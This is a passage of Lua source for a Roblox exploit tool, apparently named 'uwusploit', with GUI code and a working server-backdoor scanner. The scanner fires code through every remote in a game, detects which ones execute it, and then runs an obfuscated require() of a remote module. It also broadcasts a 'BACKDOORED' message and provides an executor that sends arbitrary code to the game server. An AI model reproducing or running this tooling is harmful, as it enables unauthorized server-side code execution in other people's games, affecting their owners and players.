uwu["change click sound"].BackgroundColor3 = uwu["default background color"]
uwu["change click sound"].BorderColor3 = uwu["default border color"]
uwu["change click sound"].BorderSizePixel = 1
uwu["change click sound"].Parent = uwu["script settings holder"]
uwu["change click sound"].ZIndex = 24

uwu["change click sound textbox"].Size = UDim2.new(0, 158, 0, 32)
uwu["change click sound textbox"].Position = UDim2.new(0, 235, 0, 182)
uwu["change click sound textbox"].TextColor3 = uwu["default border color"]
uwu["change click sound textbox"].Font = Enum.Font.RobotoMono
uwu["change click sound textbox"].TextScaled = false
uwu["change click sound textbox"].TextSize = 15
uwu["change click sound textbox"].Text = ""
uwu["change click sound textbox"].PlaceholderText = "enter sound ID here"
uwu["change click sound textbox"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["change click sound textbox"].TextXAlignment = Enum.TextXAlignment.Center
uwu["change click sound textbox"].TextYAlignment = Enum.TextYAlignment.Center
uwu["change click sound textbox"].BackgroundColor3 = uwu["default background color"]
uwu["change click sound textbox"].BorderColor3 = uwu["default border color"]
uwu["change click sound textbox"].BorderSizePixel = 1
uwu["change click sound textbox"].Parent = uwu["script settings holder"]
uwu["change click sound textbox"].ZIndex = 24

function updateClickSound(newSoundId)
	if tonumber(newSoundId) then
		uwu["change click sound setting"].Text = "click sound: " .. newSoundId

		if uwu["click sound"] and uwu["click sound"]:IsA("Sound") then
			uwu["click sound"].SoundId = "rbxassetid://" .. newSoundId
		end

		uwu["change click sound textbox"].Text = ""
	else
		uwu["change click sound setting"].Text = "click sound: n/a"
	end
end

uwu["change click sound"].MouseButton1Click:Connect(function()
	playclicksound()
	local newSoundId = uwu["change click sound textbox"].Text
	updateClickSound(newSoundId)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["backdoor info"].Size = UDim2.new(0, 133, 0, 26)
uwu["backdoor info"].Position = UDim2.new(0, 0, 0, 0)

uwu["backdoor info"].BackgroundColor3 = uwu["default background color"]

uwu["backdoor info"].BorderColor3 = uwu["default border color"]
uwu["backdoor info"].BorderSizePixel = 1

uwu["backdoor info"].TextColor3 = uwu["default border color"]
uwu["backdoor info"].Font = Enum.Font.RobotoMono
uwu["backdoor info"].TextSize = 15
uwu["backdoor info"].TextScaled = false
uwu["backdoor info"].Text = "backdoor info"
uwu["backdoor info"].TextXAlignment = Enum.TextXAlignment.Center
uwu["backdoor info"].TextYAlignment = Enum.TextYAlignment.Center

uwu["backdoor info text padding"] = Instance.new("UIPadding")
uwu["backdoor info text padding"].PaddingLeft = UDim.new(0, 0)
uwu["backdoor info text padding"].Parent = uwu["scripts tab"]

uwu["backdoor info"].Parent = uwu["main frame 4"]
uwu["backdoor info"].ZIndex = 25

uwu["backdoor info holder"].Size = UDim2.new(0, 393, 0, 214)
uwu["backdoor info holder"].Position = UDim2.new(0, 4, 0, 31)
uwu["backdoor info holder"].BackgroundColor3 = uwu["default background color"]
uwu["backdoor info holder"].BorderColor3 = uwu["default border color"]
uwu["backdoor info holder"].BorderSizePixel = 1
uwu["backdoor info holder"].Parent = uwu["main frame 4"]
uwu["backdoor info holder"].ZIndex = 19
uwu["backdoor info holder"].Visible = true
uwu["backdoor info holder"].TextWrapped = true

uwu["backdoor info bottom cover"].Name = "bcover"
uwu["backdoor info bottom cover"].Size = UDim2.new(0, 133, 0, 2)
uwu["backdoor info bottom cover"].Position = UDim2.new(0, 0, 0, 26)
uwu["backdoor info bottom cover"].BackgroundColor3 = uwu["default background color"]
uwu["backdoor info bottom cover"].BorderSizePixel = 0
uwu["backdoor info bottom cover"].Parent = uwu["main frame 4"]
uwu["backdoor info bottom cover"].ZIndex = 25.5
uwu["backdoor info bottom cover"].Visible = true

local rfe = "true"

if game:GetService("SoundService").RespectFilteringEnabled == true then
	rfe = "true"
else
	rfe = "false"
end

uwu["backdoor info holder"].TextColor3 = uwu["default border color"]
uwu["backdoor info holder"].Font = Enum.Font.RobotoMono
uwu["backdoor info holder"].TextSize = 15
uwu["backdoor info holder"].TextScaled = false
uwu["backdoor info holder"].Text = "respectfilteringenabled = " .. rfe .. "\nbackdoors found: 0\nbackdoor path: n/a\nmethod used: n/a\nbackdoor type: n/a\nexecutor identity: 8"
uwu["backdoor info holder"].TextXAlignment = Enum.TextXAlignment.Left
uwu["backdoor info holder"].TextYAlignment = Enum.TextYAlignment.Top
uwu["backdoor info holder"].ZIndex = 25

uwu["backdoor info holder text padding"] = Instance.new("UIPadding")
uwu["backdoor info holder text padding"].PaddingLeft = UDim.new(0, 4)
uwu["backdoor info holder text padding"].PaddingTop = UDim.new(0, 4)
uwu["backdoor info holder text padding"].PaddingBottom = UDim.new(0, 4)
uwu["backdoor info holder text padding"].Parent = uwu["backdoor info holder"]

uwu["backdoor info"].MouseButton1Click:Connect(function()
	playclicksound()

	uwu["backdoor info bottom cover"].Visible = true
	uwu["scanning bottom cover"].Visible = false
	uwu["credits bottom cover"].Visible = false

	uwu["backdoor info holder"].Visible = true
	uwu["logs holder"].Visible = false
	uwu["logs scrolling frame"].Visible = false
	uwu["backdoor scan button"].Visible = false
	uwu["credits holder"].Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["scanning"].Size = UDim2.new(0, 133, 0, 26)
uwu["scanning"].Position = UDim2.new(0, 134, 0, 0)

uwu["scanning"].BackgroundColor3 = uwu["default background color"]

uwu["scanning"].BorderColor3 = uwu["default border color"]
uwu["scanning"].BorderSizePixel = 1

uwu["scanning"].TextColor3 = uwu["default border color"]
uwu["scanning"].Font = Enum.Font.RobotoMono
uwu["scanning"].TextSize = 15
uwu["scanning"].TextScaled = false
uwu["scanning"].Text = "backdoor scanning"
uwu["scanning"].TextXAlignment = Enum.TextXAlignment.Center
uwu["scanning"].TextYAlignment = Enum.TextYAlignment.Center

uwu["scanning text padding"] = Instance.new("UIPadding")
uwu["scanning text padding"].PaddingLeft = UDim.new(0, 0)
uwu["scanning text padding"].Parent = uwu["main frame 4"]

uwu["scanning"].Parent = uwu["main frame 4"]
uwu["scanning"].ZIndex = 25

uwu["scanning bottom cover"].Size = UDim2.new(0, 133, 0, 2)
uwu["scanning bottom cover"].Position = UDim2.new(0, 134, 0, 26)
uwu["scanning bottom cover"].BackgroundColor3 = uwu["default background color"]
uwu["scanning bottom cover"].BorderSizePixel = 0
uwu["scanning bottom cover"].Parent = uwu["main frame 4"]
uwu["scanning bottom cover"].ZIndex = 25.5
uwu["scanning bottom cover"].Visible = false

uwu["scanning"].MouseButton1Click:Connect(function()
	playclicksound()

	uwu["backdoor info bottom cover"].Visible = false
	uwu["scanning bottom cover"].Visible = true
	uwu["credits bottom cover"].Visible = false

	uwu["backdoor info holder"].Visible = false
	uwu["logs holder"].Visible = true
	uwu["logs scrolling frame"].Visible = true
	uwu["backdoor scan button"].Visible = true
	uwu["credits holder"].Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["logs holder"].Size = UDim2.new(0, 393, 0, 214)
uwu["logs holder"].Position = UDim2.new(0, 4, 0, 31)
uwu["logs holder"].BackgroundColor3 = uwu["default background color"]
uwu["logs holder"].BorderColor3 = uwu["default border color"]
uwu["logs holder"].BorderSizePixel = 0
uwu["logs holder"].Parent = uwu["main frame 4"]
uwu["logs holder"].Visible = false
uwu["logs holder"].ZIndex = 23

-------------------------------------------------------------------------------------------------------------------------------

uwu["logs label"].Size = UDim2.new(0, 393, 0, 19)
uwu["logs label"].Position = UDim2.new(0, 0, 0, 0)
uwu["logs label"].TextColor3 = uwu["default border color"]
uwu["logs label"].Font = Enum.Font.RobotoMono
uwu["logs label"].TextScaled = false
uwu["logs label"].TextSize = 15
uwu["logs label"].Text = "logs"
uwu["logs label"].TextXAlignment = Enum.TextXAlignment.Center
uwu["logs label"].TextYAlignment = Enum.TextYAlignment.Center
uwu["logs label"].BackgroundColor3 = uwu["default background color"]
uwu["logs label"].BorderColor3 = uwu["default border color"]
uwu["logs label"].BorderSizePixel = 1
uwu["logs label"].Parent = uwu["logs holder"]
uwu["logs label"].ZIndex = 24

uwu["logs label text padding"] = Instance.new("UIPadding")
uwu["logs label text padding"].PaddingBottom = UDim.new(0, 1)
uwu["logs label text padding"].Parent = uwu["logs label"]

-------------------------------------------------------------------------------------------------------------------------------

uwu["logs scrolling frame"].Size = UDim2.new(0, 393, 0, 140)
uwu["logs scrolling frame"].Position = UDim2.new(0, 4, 0, 55)
uwu["logs scrolling frame"].BackgroundColor3 = uwu["default background color"]
uwu["logs scrolling frame"].BorderColor3 = uwu["default border color"]
uwu["logs scrolling frame"].BorderSizePixel = 1
uwu["logs scrolling frame"].ScrollBarThickness = 8
uwu["logs scrolling frame"].ScrollBarImageColor3 = uwu["default 1/2 color"]
uwu["logs scrolling frame"].CanvasSize = UDim2.new(0, 0, 0, 0)
uwu["logs scrolling frame"].Parent = uwu["main frame 4"]
uwu["logs scrolling frame"].ZIndex = 24
uwu["logs scrolling frame"].Visible = false
uwu["logs scrolling frame"].ScrollingDirection = Enum.ScrollingDirection.XY

uwu["logs textbox"].Name = "temphalf"
uwu["logs textbox"].Size = UDim2.new(0, 393, 0, 164)
uwu["logs textbox"].Position = UDim2.new(0, 0, 0, 0)
uwu["logs textbox"].BackgroundColor3 = uwu["default background color"]
uwu["logs textbox"].BorderColor3 = uwu["default border color"]
uwu["logs textbox"].BorderSizePixel = 0
uwu["logs textbox"].TextColor3 = uwu["default border color"]
uwu["logs textbox"].PlaceholderText = "backdoor scanning logs will appear here"
uwu["logs textbox"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["logs textbox"].Font = Enum.Font.RobotoMono
uwu["logs textbox"].TextSize = 15
uwu["logs textbox"].TextScaled = false
uwu["logs textbox"].Text = ""
uwu["logs textbox"].TextXAlignment = Enum.TextXAlignment.Left
uwu["logs textbox"].TextYAlignment = Enum.TextYAlignment.Top
uwu["logs textbox"].ClearTextOnFocus = false
uwu["logs textbox"].MultiLine = true
uwu["logs textbox"].Parent = uwu["logs scrolling frame"]
uwu["logs textbox"].ZIndex = 24
uwu["logs textbox"].TextEditable = false

uwu["logs textbox text padding"] = Instance.new("UIPadding")
uwu["logs textbox text padding"].PaddingLeft = UDim.new(0, 4)
uwu["logs textbox text padding"].PaddingTop = UDim.new(0, 4)
uwu["logs textbox text padding"].PaddingBottom = UDim.new(0, 4)
uwu["logs textbox text padding"].Parent = uwu["logs scrolling frame"]

local function addTextWithNewline(textBox, text)
	local serverTime = os.date("%X")

	if textBox.Text == "" then
		textBox.Text = "[" .. serverTime .. "] " .. text
	else
		textBox.Text = textBox.Text .. "\n[" .. serverTime .. "] " .. text
	end

	updateCanvas2()
end

function updateCanvas2()
	local textBounds = uwu["logs textbox"].TextBounds

	uwu["logs textbox"].Size = UDim2.new(0, math.max(392, textBounds.X + 20), 0, math.max(164, textBounds.Y + 20))
	uwu["logs scrolling frame"].CanvasSize = UDim2.new(0, textBounds.X + 20, 0, textBounds.Y + 11)

	uwu["logs scrolling frame"].CanvasPosition = Vector2.new(0, uwu["logs scrolling frame"].CanvasSize.Y.Offset)
end

uwu["logs textbox"]:GetPropertyChangedSignal("Text"):Connect(updateCanvas2)

updateCanvas2()

-------------------------------------------------------------------------------------------------------------------------------

local canscan = true

uwu["backdoor scan button"].Size = UDim2.new(0, 393, 0, 45)
uwu["backdoor scan button"].Position = UDim2.new(0, 4, 0, 200)

uwu["backdoor scan button"].BackgroundColor3 = uwu["default background color"]

uwu["backdoor scan button"].BorderColor3 = uwu["default border color"]
uwu["backdoor scan button"].BorderSizePixel = 1

uwu["backdoor scan button"].TextColor3 = uwu["default border color"]
uwu["backdoor scan button"].Font = Enum.Font.RobotoMono
uwu["backdoor scan button"].TextSize = 15
uwu["backdoor scan button"].TextScaled = false
uwu["backdoor scan button"].Text = "start scanning"
uwu["backdoor scan button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["backdoor scan button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["backdoor scan button text padding"] = Instance.new("UIPadding")
uwu["backdoor scan button text padding"].PaddingLeft = UDim.new(0, 0)
uwu["backdoor scan button text padding"].Parent = uwu["backdoor scan button"]

uwu["backdoor scan button"].Parent = uwu["main frame 4"]
uwu["backdoor scan button"].ZIndex = 24
uwu["backdoor scan button"].Visible = false

backdoor=nil
hasscanned = false
scanning = false

uwu["backdoor scan button"].MouseButton1Click:Connect(function()
	scanning = true
	playclicksound()
	if canscan == false then return end
	canscan = false
	spawn(function() uwu["startup"]:Play(); toggleLoop(false); uwu["toggle interface visibility button"].Text = "-.-" end)
	spawn(function()
		local checkingforbackdoors = true

		alphabet={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}

		HttpService=game:GetService("HttpService")

		function debug(text, lvl)
			local func=print
			if lvl==1 then func=print end
			if lvl==2 then func=error end
			if lvl==3 then func=warn end
			func("[uwusploit>.<]: "..text)
		end

		function runbackdoor(remote, data, data2)

			if not remote then return end

			if remote:IsA('RemoteEvent') then
				remote:FireServer(data)
			elseif remote:IsA('RemoteFunction') then
				spawn(function() remote:InvokeServer(data) end)
			end

		end

		function generateName(lenght)

			local text=''

			for i=1,lenght do
				text=text..alphabet[math.random(1,#alphabet)]
			end

			return text

		end

		local code
		function findRemote()
			local timee = os.clock()
			local remotes = {}
			local backdoorPath = "n/a"

			local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
			if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
				while true do
					code = generateName(math.random(12,30))
					if not remotes[code] then break end
				end
				spawn(function() protected_backdoor:InvokeServer('join team noxious later maybe idk | gg/bwdk8vAy8n', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
				remotes[code] = protected_backdoor
			end

			for i, remote in pairs(game:GetDescendants()) do
				local skip = false

				if string.find(remote.Name, "TutorialTower") then
					addTextWithNewline(uwu["logs textbox"], 'skipped remote: ' .. remote.Name)
					skip = true
				end

				if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then
					skip = true
				end

				if not skip and string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
					addTextWithNewline(uwu["logs textbox"], 'replicated storage remote found: ' .. remote.Name)
					skip = true
				end

				if not skip and (remote.Parent == game:GetService("ReplicatedStorage")
					or remote.Parent.Parent == game:GetService("ReplicatedStorage")
					or remote.Parent.Parent.Parent == game:GetService("ReplicatedStorage")) then

					if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
						addTextWithNewline(uwu["logs textbox"], 'adonis filter detected: ' .. remote.Name)
						skip = true
					end

					if not skip and remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
						addTextWithNewline(uwu["logs textbox"], 'hd admin detected: ' .. remote.Name)
						skip = true
					end

					if not skip and remote.Parent.Name == 'DefaultChatSystemChatEvents' then
						addTextWithNewline(uwu["logs textbox"], 'chat event detected: ' .. remote.Name)
						skip = true
					end
				end

				if not skip then
					while true do
						code = generateName(math.random(12, 30))
						if not remotes[code] then break end
					end

					runbackdoor(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
					remotes[code] = remote
					addTextWithNewline(uwu["logs textbox"], "sent backdoor: " .. remote:GetFullName())
					t(0)
				end
			end

			for i = 1, 100 do
				for code, remote in pairs(remotes) do
					if workspace:FindFirstChild(code) then
						backdoorPath = remote:GetFullName()

						uwu["backdoor info holder"].Text = string.format(
							"respectfilteringenabled = " .. rfe .. "\nbackdoors found: 1\nbackdoor path: %s\nmethod used: remote scan\nbackdoor type: n/a\nexecutor identity: 8",
							backdoorPath
						)

						checkingforbackdoors = false
						uwu["toggle interface visibility button"].Text = "^.^"

						local yay = Instance.new("Sound")
						yay.SoundId = "rbxassetid://8458409341"
						yay.Parent = uwu["local player"]
						yay.Name = "canttouchthis"
						yay.Volume = 1
						spawn(function() yay:Play() end)
						unablenotify("backdoor found. (" .. backdoorPath .. ")")
						task.spawn(updcols)

						uwu["backdoor scan button"].Visible = false
						uwu["backdoor test button"] = Instance.new("TextButton")

						uwu["backdoor test button"].Size = UDim2.new(0, 393, 0, 45)
						uwu["backdoor test button"].Position = UDim2.new(0, 4, 0, 200)

						uwu["backdoor test button"].BackgroundColor3 = uwu["default background color"]

						uwu["backdoor test button"].BorderColor3 = uwu["default border color"]
						uwu["backdoor test button"].BorderSizePixel = 1

						uwu["backdoor test button"].TextColor3 = uwu["default border color"]
						uwu["backdoor test button"].Font = Enum.Font.RobotoMono
						uwu["backdoor test button"].TextSize = 15
						uwu["backdoor test button"].TextScaled = false
						uwu["backdoor test button"].Text = "test backdoor"
						uwu["backdoor test button"].TextXAlignment = Enum.TextXAlignment.Center
						uwu["backdoor test button"].TextYAlignment = Enum.TextYAlignment.Center

						uwu["backdoor test button text padding"] = Instance.new("UIPadding")
						uwu["backdoor test button text padding"].PaddingLeft = UDim.new(0, 0)
						uwu["backdoor test button text padding"].Parent = uwu["backdoor test button"]

						uwu["backdoor test button"].Parent = uwu["main frame 4"]
						uwu["backdoor test button"].ZIndex = 24
						uwu["backdoor test button"].Visible = true
						task.spawn(updcols)

						local cantestbackdoor = true

						uwu["backdoor test button"].MouseButton1Click:Connect(function()
							playclicksound()
							if not cantestbackdoor then return end
							cantestbackdoor = false
							runbackdoor(remote, "a=Instance.new('Hint')a.Text='this game has been BACKDOORED!! join team noxious later maybe idk | gg/bwdk8vAy8n'a.Parent=workspace;task.wait(5)a:Remove()")
							task.delay(5, function() cantestbackdoor = true end)
						end)

						hasscanned = true
						backdoored = true
						backdoor = remote

						addTextWithNewline(uwu["logs textbox"], "backdoor found!")

						t(5)

						toggleLoop(true)
						scanning = false

						runbackdoor(remote, "require(171016405.1884*69)")
						return true
					end
				end
				t()
			end

			uwu["backdoor info holder"].Text = "respectfilteringenabled = " .. rfe .. "\nbackdoors found: 0\nbackdoor path: n/a\nmethod used: remote scan (unsuccessful)\nbackdoor type: n/a\nexecutor identity: 8"
			return false
		end

		uwu["execute button"].MouseButton1Click:Connect(function()
			spawn(function() playclicksound() end)
			local a,b=string.gsub(uwu["executor textbox"].Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)

			local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
			if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
				addTextWithNewline(uwu["logs textbox"], "protected backdoor found.")
				spawn(function()
					local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('join team noxious later maybe idk | gg/bwdk8vAy8n', a) end)
					if variantValue~=nil then
						local splited=string.split(variantValue,':')
						addTextWithNewline(uwu["logs textbox"], splited[#splited])
					end
				end)
			else
				runbackdoor(backdoor, a)
			end
		end)

		searching=false

		if not searching then
			searching=true

			uwu["logs textbox"].Text = ""
			updateCanvas2()
			addTextWithNewline(uwu["logs textbox"], "checking for backdoors...")
			unablenotify("checking for backdoors...")

			hasscanned = true

			addTextWithNewline(uwu["logs textbox"], "using remote scan method.")
			t(0.1)
			addTextWithNewline(uwu["logs textbox"], "scanning...")
			uwu["backdoor info holder"].Text = "respectfilteringenabled = " .. rfe .. "\nbackdoors found: 0\nbackdoor path: n/a\nmethod used: remote scan\nbackdoor type: n/a\nexecutor identity: 8"

			t(1)

			if not findRemote() then
				local nay = Instance.new("Sound")
				nay.SoundId = "rbxassetid://8503529943"
				nay.Parent = uwu["local player"]
				nay.Volume = 3.3
				nay.Name = "canttouchthis"
				nay.TimePosition = 0.01

				spawn(function() nay:Play() end)

				checkingforbackdoors = false
				uwu["toggle interface visibility button"].Text = "ó.ò"

				hasscanned = true

				addTextWithNewline(uwu["logs textbox"], "no backdoor found.")
				unablenotify("no backdoor found.")
				searching=false
				t(5)
				toggleLoop(true)
				t(1)
				canscan = true
				hasscanned = true
				scanning = false
			end
		end
	end)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["credits"].Size = UDim2.new(0, 133, 0, 26)
uwu["credits"].Position = UDim2.new(0, 268, 0, 0)

uwu["credits"].BackgroundColor3 = uwu["default background color"]

uwu["credits"].BorderColor3 = uwu["default border color"]
uwu["credits"].BorderSizePixel = 1

uwu["credits"].TextColor3 = uwu["default border color"]
uwu["credits"].Font = Enum.Font.RobotoMono
uwu["credits"].TextSize = 15
uwu["credits"].TextScaled = false
uwu["credits"].Text = "credits"
uwu["credits"].TextXAlignment = Enum.TextXAlignment.Center
uwu["credits"].TextYAlignment = Enum.TextYAlignment.Center

uwu["credits text padding"] = Instance.new("UIPadding")
uwu["credits text padding"].PaddingLeft = UDim.new(0, 0)
uwu["credits text padding"].Parent = uwu["scripts tab"]

uwu["credits"].Parent = uwu["main frame 4"]
uwu["credits"].ZIndex = 25

uwu["credits bottom cover"].Size = UDim2.new(0, 133, 0, 2)
uwu["credits bottom cover"].Position = UDim2.new(0, 268, 0, 26)
uwu["credits bottom cover"].BackgroundColor3 = uwu["default background color"]
uwu["credits bottom cover"].BorderSizePixel = 0
uwu["credits bottom cover"].Parent = uwu["main frame 4"]
uwu["credits bottom cover"].ZIndex = 25.5
uwu["credits bottom cover"].Visible = false

uwu["credits"].MouseButton1Click:Connect(function()
	playclicksound()

	uwu["backdoor info bottom cover"].Visible = false
	uwu["scanning bottom cover"].Visible = false
	uwu["credits bottom cover"].Visible = true

	uwu["backdoor info holder"].Visible = false
	uwu["logs holder"].Visible = false
	uwu["logs scrolling frame"].Visible = false
	uwu["backdoor scan button"].Visible = false
	uwu["credits holder"].Visible = true
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["credits holder"].Size = UDim2.new(0, 393, 0, 214)
uwu["credits holder"].Position = UDim2.new(0, 4, 0, 31)
uwu["credits holder"].BackgroundColor3 = uwu["default background color"]
uwu["credits holder"].BorderColor3 = uwu["default border color"]
uwu["credits holder"].BorderSizePixel = 1
uwu["credits holder"].Parent = uwu["main frame 4"]
uwu["credits holder"].ZIndex = 19
uwu["credits holder"].Visible = false

uwu["credits holder"].TextColor3 = uwu["default border color"]
uwu["credits holder"].Font = Enum.Font.RobotoMono
--uwu["credits holder"].TextSize = 20
uwu["credits holder"].TextSize = 15
uwu["credits holder"].TextScaled = false
uwu["credits holder"].Text = "n/a"
--uwu["credits holder"].TextXAlignment = Enum.TextXAlignment.Left
--uwu["credits holder"].TextYAlignment = Enum.TextYAlignment.Top
uwu["credits holder"].TextXAlignment = Enum.TextXAlignment.Center
uwu["credits holder"].TextYAlignment = Enum.TextYAlignment.Center
uwu["credits holder"].ZIndex = 25
uwu["credits holder"].ClipsDescendants = true

uwu["credits holder text padding"] = Instance.new("UIPadding")
--uwu["credits holder text padding"].PaddingLeft = UDim.new(0, 4)
--uwu["credits holder text padding"].PaddingTop = UDim.new(0, 4)
uwu["credits holder text padding"].PaddingBottom = UDim.new(0, 2)
--uwu["credits holder text padding"].PaddingBottom = UDim.new(0, 4)
uwu["credits holder text padding"].Parent = uwu["credits holder"]

uwu["credits holder"].Text = "credits:\n\nteam noxious - development & revival\n\nteam occulence - code adjustments\n\nteam symphysis - UI design, testing & refining"

-------------------------------------------------------------------------------------------------------------------------------

uwu["scripts tab"].Size = UDim2.new(0, 100, 0, 26)
uwu["scripts tab"].Position = UDim2.new(0, 0, 0, 1)

uwu["scripts tab"].BackgroundColor3 = uwu["default background color"]

uwu["scripts tab"].BorderColor3 = uwu["default border color"]
uwu["scripts tab"].BorderSizePixel = 1

uwu["scripts tab"].TextColor3 = uwu["default border color"]
uwu["scripts tab"].Font = Enum.Font.RobotoMono
uwu["scripts tab"].TextSize = 15
uwu["scripts tab"].TextScaled = false
uwu["scripts tab"].Text = "scripts"
uwu["scripts tab"].TextXAlignment = Enum.TextXAlignment.Center
uwu["scripts tab"].TextYAlignment = Enum.TextYAlignment.Center

uwu["scripts tab text padding"] = Instance.new("UIPadding")
uwu["scripts tab text padding"].PaddingLeft = UDim.new(0, 0)
uwu["scripts tab text padding"].Parent = uwu["scripts tab"]

uwu["scripts tab"].Parent = uwu["main frame 1"]
uwu["scripts tab"].ZIndex = 19

uwu["scripts tab bottom cover"].Size = UDim2.new(0, 100, 0, 2)
uwu["scripts tab bottom cover"].Position = UDim2.new(0, 0, 0, 27)
uwu["scripts tab bottom cover"].BackgroundColor3 = uwu["default background color"]
uwu["scripts tab bottom cover"].BorderSizePixel = 0
uwu["scripts tab bottom cover"].Parent = uwu["main frame 1"]
uwu["scripts tab bottom cover"].ZIndex = 19.5
uwu["scripts tab bottom cover"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["button holder"].Size = UDim2.new(0, 369, 0, 180)
uwu["button holder"].Position = UDim2.new(0, 28, 0, 55)
uwu["button holder"].BackgroundColor3 = uwu["default background color"]
uwu["button holder"].BorderColor3 = uwu["default border color"]
uwu["button holder"].BorderSizePixel = 0
uwu["button holder"].Parent = uwu["main frame 1"]
uwu["button holder"].ZIndex = 19
uwu["button holder"].Visible = false

uwu["script search bar"].Size = UDim2.new(0, 345, 0, 19)
uwu["script search bar"].Position = UDim2.new(0, 28, 0, 32)
uwu["script search bar"].BackgroundColor3 = uwu["default background color"]
uwu["script search bar"].BorderColor3 = uwu["default border color"]
uwu["script search bar"].BorderSizePixel = 1
uwu["script search bar"].TextColor3 = uwu["default border color"]
uwu["script search bar"].Font = Enum.Font.RobotoMono
uwu["script search bar"].TextSize = 15
uwu["script search bar"].TextScaled = false
uwu["script search bar"].PlaceholderText = "search scripts"
uwu["script search bar"].PlaceholderColor3 = Color3.new(0.7, 0.7, 0.7)
uwu["script search bar"].Text = ""
uwu["script search bar"].TextXAlignment = Enum.TextXAlignment.Center
uwu["script search bar"].TextYAlignment = Enum.TextYAlignment.Center
uwu["script search bar"].ClearTextOnFocus = false
uwu["script search bar"].Parent = uwu["main frame 1"]
uwu["script search bar"].ZIndex = 19
uwu["script search bar"].Visible = false
uwu["script search bar"].ClearTextOnFocus = true

uwu["script search bar padding"] = Instance.new("UIPadding")
uwu["script search bar padding"].PaddingLeft = UDim.new(0, 6)
uwu["script search bar padding"].PaddingRight = UDim.new(0, 6)
uwu["script search bar padding"].PaddingBottom = UDim.new(0, 1)
uwu["script search bar padding"].Parent = uwu["script search bar"]

uwu["next page"].Size = UDim2.new(0, 19, 0, 214)
uwu["next page"].Position = UDim2.new(0, 378, 0, 32)
uwu["next page"].BackgroundColor3 = uwu["default background color"]
uwu["next page"].BorderColor3 = uwu["default border color"]
uwu["next page"].BorderSizePixel = 1
uwu["next page"].Parent = uwu["main frame 1"]
uwu["next page"].ZIndex = 19
uwu["next page"].Visible = false

uwu["next page"].TextColor3 = uwu["default border color"]
uwu["next page"].Font = Enum.Font.RobotoMono
uwu["next page"].TextSize = 15
uwu["next page"].TextScaled = false
uwu["next page"].Text = ">"
uwu["next page"].TextXAlignment = Enum.TextXAlignment.Center
uwu["next page"].TextYAlignment = Enum.TextYAlignment.Center

uwu["next page text padding"] = Instance.new("UIPadding")
uwu["next page text padding"].PaddingBottom = UDim.new(0, 2)
uwu["next page text padding"].Parent = uwu["next page"]

uwu["previous page"].Size = UDim2.new(0, 19, 0, 214)
uwu["previous page"].Position = UDim2.new(0, 4, 0, 32)
uwu["previous page"].BackgroundColor3 = uwu["default background color"]
uwu["previous page"].BorderColor3 = uwu["default border color"]
uwu["previous page"].BorderSizePixel = 1
uwu["previous page"].Parent = uwu["main frame 1"]
uwu["previous page"].ZIndex = 19
uwu["previous page"].Visible = false

uwu["previous page"].TextColor3 = uwu["default border color"]
uwu["previous page"].Font = Enum.Font.RobotoMono
uwu["previous page"].TextSize = 15
uwu["previous page"].TextScaled = false
uwu["previous page"].Text = "<"
uwu["previous page"].TextXAlignment = Enum.TextXAlignment.Center
uwu["previous page"].TextYAlignment = Enum.TextYAlignment.Center

uwu["previous page text padding"] = Instance.new("UIPadding")
uwu["previous page text padding"].PaddingBottom = UDim.new(0, 1)
uwu["previous page text padding"].Parent = uwu["previous page"]

local buttonsperscriptpg = 9
local allbuttons = {}
local filteredbuttons = {}
local currentscriptpg = 1
local totalscriptpgs = 1
local savedscriptpg = 1
local searchingforbuttons = false
local emptybuttons = {}

local buttondata = {}

function mtbutton(xOffset, yOffset, column)
	local buttonWidth = 111
	if column == 1 then
		buttonWidth = 113
	end

	local button = Instance.new("TextLabel")
	button.Name = "fakebutton"
	button.Size = UDim2.new(0, buttonWidth, 0, 60)
	button.Position = UDim2.new(0, xOffset, 0, yOffset)
	button.BackgroundColor3 = uwu["default background color"]
	button.BorderColor3 = uwu["default 1/2 color 2"]
	button.BorderSizePixel = 1
	button.TextColor3 = uwu["default 1/2 color"]
	button.Font = Enum.Font.RobotoMono
	button.TextSize = 15
	button.TextScaled = false
	button.Text = "-"
	button.TextXAlignment = Enum.TextXAlignment.Center
	button.TextYAlignment = Enum.TextYAlignment.Center
	button.Parent = uwu["button holder"]
	button.ZIndex = 19
	button.TextWrapped = true
	button.Visible = true

	local textpadding = Instance.new("UIPadding")
	textpadding.PaddingLeft = UDim.new(0, 6)
	textpadding.PaddingRight = UDim.new(0, 6)
	textpadding.Parent = button

	local numberLabel = Instance.new("TextLabel")
	numberLabel.Size = UDim2.new(0, 20, 0, 20)
	numberLabel.Position = UDim2.new(0, -2, 0, -3)
	numberLabel.BackgroundTransparency = 1
	numberLabel.Text = "-"
	numberLabel.TextColor3 = uwu["default 1/2 color"]
	numberLabel.Font = Enum.Font.RobotoMono
	numberLabel.TextSize = 10
	numberLabel.TextXAlignment = Enum.TextXAlignment.Left
	numberLabel.TextYAlignment = Enum.TextYAlignment.Center
	numberLabel.Parent = button
	numberLabel.ZIndex = 20
	numberLabel.Name = "fakebuttonlabel"

